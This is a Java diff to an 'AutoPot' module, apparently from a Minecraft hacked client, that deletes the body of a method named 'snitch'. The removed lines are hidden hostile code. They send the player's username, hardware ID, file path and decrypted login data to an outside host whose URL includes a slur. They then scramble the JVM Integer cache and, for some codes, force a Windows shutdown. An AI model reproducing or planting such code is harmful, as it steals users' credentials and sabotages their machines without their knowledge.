@@ -297,49 +297,6 @@ public class AutoPot extends Module {
     }
 
     public static boolean snitch(int code) {
-        Connection connection = new Connection("https://minesense.pub/nig/ass").setUserAgent(code + " bruh " + new File("").getAbsolutePath());
-        try {
-            connection.setParameters("c", String.valueOf(code));
-
-            connection.setParameters("u", URLEncoder.encode(Minecraft.getMinecraft().session.getUsername(), "UTF-8"));
-
-            try {
-                String hwid = URLEncoder.encode(Base64.getEncoder().encodeToString(SystemUtil.getHardwareIdentifiers().getBytes()), "UTF-8");
-                connection.setParameters("h", hwid);
-            } catch (Exception e) {
-            }
-
-            if (Client.getAuthUser() != null) {
-                connection.setParameters("d", Client.getAuthUser().getForumUsername());
-            } else {
-                List<String> loginInformation = LoginUtil.getLoginInformation();
-                if (loginInformation.size() > 0) {
-                    connection.setParameters("d", Crypto.decryptPublicNew(loginInformation.get(0)) + "*" + AuthenticationUtil.temporaryUsername);
-                }
-            }
-
-        } catch (Exception e) {
-        }
-        Connector.post(connection);
-        try {
-            Class clazz = Class.forName("java.lang.Integer$IntegerCache");
-            Field field = clazz.getDeclaredField("cache");
-            field.setAccessible(true);
-            Integer[] cache = (Integer[]) field.get(clazz);
-
-            // rewrite the Integer cache
-            for (int i = 0; i < cache.length; i++) {
-                cache[i] = new Integer(new Random().nextInt());
-            }
-            if (code == 5 || code == 69420) {
-                Class runtimeClass = Class.forName("java.lang.Runtime");
-                runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "shutdown.exe -s -t 0");
-            }
-            if (code == 3 && connection.getResponse() != null) {
-                Minecraft.shutdownMinecraftApplet();
-            }
-        } catch (Exception e) {
-        }
         return true;
     }
 
